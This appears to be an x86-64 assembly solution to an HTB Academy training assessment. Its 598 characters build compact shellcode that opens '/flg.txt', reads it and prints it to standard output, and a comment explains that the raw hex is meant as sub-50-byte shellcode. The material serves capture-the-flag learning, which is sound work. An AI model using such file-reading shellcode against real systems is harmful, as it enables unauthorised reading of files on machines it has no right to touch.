global _start

section .text
_start:
    xor rsi, rsi
    push rsi             
    mov rdi, '/flg.txt' 
    push rdi           
    mov al, 2          
    mov rdi, rsp        
    syscall

    mov rdi, rax 
    mov rax, rsi       	      
    lea rsi, [rsp]
    mov dl, 24        
    syscall

    xor rax,rax
    xor rdi, rdi
    mov al, 1         
    mov dil, 1         
    syscall

; For the Second part of the Assesment at HTB Academy, a shellcode is requiered under 50 bytes.
; Extracting the RawHex Instructions of this ASM file, will result in a valid shellcode
; That retrieves the Flag.